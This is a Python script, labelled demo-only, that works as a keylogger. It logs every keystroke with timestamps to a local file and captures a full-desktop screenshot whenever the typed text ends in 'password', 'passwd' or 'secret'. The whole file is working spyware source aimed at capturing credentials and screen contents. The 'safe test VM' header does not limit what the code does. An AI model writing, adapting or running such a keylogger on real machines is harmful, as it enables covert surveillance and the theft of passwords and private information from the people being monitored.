"""
keylogger_watch_and_snap.py   –   demo‑only, run in a safe test VM
"""
from pynput.keyboard import Key, Listener
from datetime import datetime
from pathlib import Path
import mss, mss.tools

# ─────────── config ─────────── #
LOG_DIR        = Path(__file__).parent / "logs"
LOG_DIR.mkdir(exist_ok=True)
LOG_FILE       = LOG_DIR / "keylog.txt"
TRIGGER_WORDS  = {"password", "passwd", "secret"}   # lowercase
SCREEN_DIR     = LOG_DIR / "screens"
SCREEN_DIR.mkdir(exist_ok=True)
# ────────────────────────────── #

typed_buffer = ""   # rolling string of recent characters

# ─────────── helpers ────────── #
def grab_screenshot():
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    png = SCREEN_DIR / f"snap_{ts}.png"
    with mss.mss() as sct:
        img = sct.grab(sct.monitors[0])        # full virtual desktop
        mss.tools.to_png(img.rgb, img.size, output=str(png))
    return png

# ────── keylogger callbacks ─── #
def on_press(key):
    global typed_buffer
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # write key to file & buffer
    if hasattr(key, "char"):
        char = key.char
        typed_buffer += char
        line = f"{ts} - {char}\n"
    else:
        char = f"[{key}]"
        typed_buffer += " "   # break words on specials
        line = f"{ts} - {char}\n"

    with LOG_FILE.open("a", encoding="utf-8") as f:
        f.write(line)

    # trigger‑word detection
    lowered = typed_buffer.lower()
    for word in TRIGGER_WORDS:
        if lowered.endswith(word):
            snap = grab_screenshot()
            with LOG_FILE.open("a", encoding="utf-8") as f:
                f.write(f"{ts} - <screenshot taken: {snap.name}>\n")
            break   # one shot per match

    # keep only last 50 chars to save RAM
    typed_buffer = typed_buffer[-50:]

def on_release(key):
    if key == Key.esc:        # hit Esc to quit
        return False

# ─────────── main ──────────── #
if __name__ == "__main__":
    print("[*] Listening…  (press Esc to exit)")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print("[*] Stopped.")
